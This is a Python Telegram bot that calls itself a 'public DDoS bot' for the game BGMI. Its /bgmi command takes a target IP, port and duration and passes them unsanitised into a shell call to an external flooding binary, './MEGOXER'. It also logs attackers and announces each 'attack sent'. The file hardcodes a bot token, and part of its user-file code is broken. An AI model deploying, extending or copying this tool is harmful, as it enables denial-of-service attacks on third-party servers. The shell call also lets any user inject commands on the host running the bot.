import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7313471299:AAGaeNSo3J3dekxwxy6x7Bv23CVXxCTHxrk')

# Admin user IDs
admin_id = ["7469108296"] 

# File to store allowed user IDs  
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open("r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        [user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
            else:
                file.truncate(0)
                response = "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
    except FileNotFoundError:
        response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
                else:
                    file.truncate(0)
                    response = "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆"
        except FileNotFoundError:
            response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱"
    else:
        response = "💢 𝗢𝗡𝗟𝗬 𝗔𝗗𝗠𝗜𝗡 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💢"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
        except FileNotFoundError:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
    else:
        response = "💢 𝗢𝗡𝗟𝗬 𝗔𝗗𝗠𝗜𝗡 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💢"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
                bot.reply_to(message, response)
        else:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
            bot.reply_to(message, response)
    else:
        response = "💢 𝗢𝗡𝗟𝗬 𝗔𝗗𝗠𝗜𝗡 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💢"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: @{username}"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}


# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "❕𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝗽𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 300 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❕"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 80:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 80 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./MEGOXER {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅"
        else:
            response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗜𝗣, 𝗽𝗼𝗿𝘁, 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲𝘀"  # Updated command syntax
    else:
        response = "🚫 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! 🚫"

    bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"🔆 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗘𝗚𝗢𝗫𝗘𝗥 𝗣𝗨𝗕𝗟𝗜𝗖 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔆"
    bot.reply_to(message, response)




bot.polling()